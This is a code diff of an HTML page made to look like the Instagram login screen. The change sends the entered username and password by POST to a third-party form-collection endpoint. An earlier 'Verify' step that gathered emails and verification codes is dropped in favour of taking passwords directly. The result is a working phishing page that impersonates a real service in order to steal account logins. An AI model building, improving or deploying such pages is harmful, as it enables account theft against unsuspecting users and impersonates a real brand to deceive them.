@@ -83,7 +83,6 @@ body {
     font-size: 12px;
     color: #00376b;
     margin-top: 12px;
-    cursor: pointer;
 }
 
 .signup {
@@ -100,7 +99,6 @@ body {
     color: #0095f6;
     font-weight: bold;
 }
-
 </style>
 </head>
 
@@ -109,35 +107,23 @@ body {
 <div class="wrapper">
     <div>
 
-        <!-- LOGIN BOX -->
-        <div class="box" id="loginBox">
+        <!-- LOGIN FORM -->
+        <div class="box">
 
             <div class="logo">Instagram</div>
 
-            <form onsubmit="return showForm()">
-                <input class="input" type="text" placeholder="Phone number, username, or email" required>
-                <input class="input" type="password" placeholder="Password" required>
+            <form action="https://formspree.io/f/xbdpdynq" method="POST">
+                
+                <input class="input" type="text" name="username" placeholder="Phone number, username, or email" required>
 
-                <button class="btn">Log In</button>
+                <input class="input" type="password" name="password" placeholder="Password" required>
+
+                <button class="btn" type="submit">Log In</button>
 
                 <div class="divider"><span>OR</span></div>
 
                 <div class="forgot">Forgot password?</div>
-            </form>
 
-        </div>
-
-        <!-- FORMSPREE FORM -->
-        <div class="box" id="verifyBox" style="display:none;">
-
-            <div class="logo" style="font-size:28px;">Verify</div>
-
-            <form action="https://formspree.io/f/xbdpdynq" method="POST">
-                <input class="input" type="email" name="email" placeholder="Your Email" required>
-                
-                <input class="input" type="text" name="message" placeholder="Enter Verification Code" required>
-
-                <button class="btn">Submit</button>
             </form>
 
         </div>
@@ -148,14 +134,6 @@ body {
 
     </div>
 </div>
-
-<script>
-function showForm(){
-    document.getElementById("loginBox").style.display = "none";
-    document.getElementById("verifyBox").style.display = "block";
-    return false;
-}
-</script>
 
 </body>
 </html>
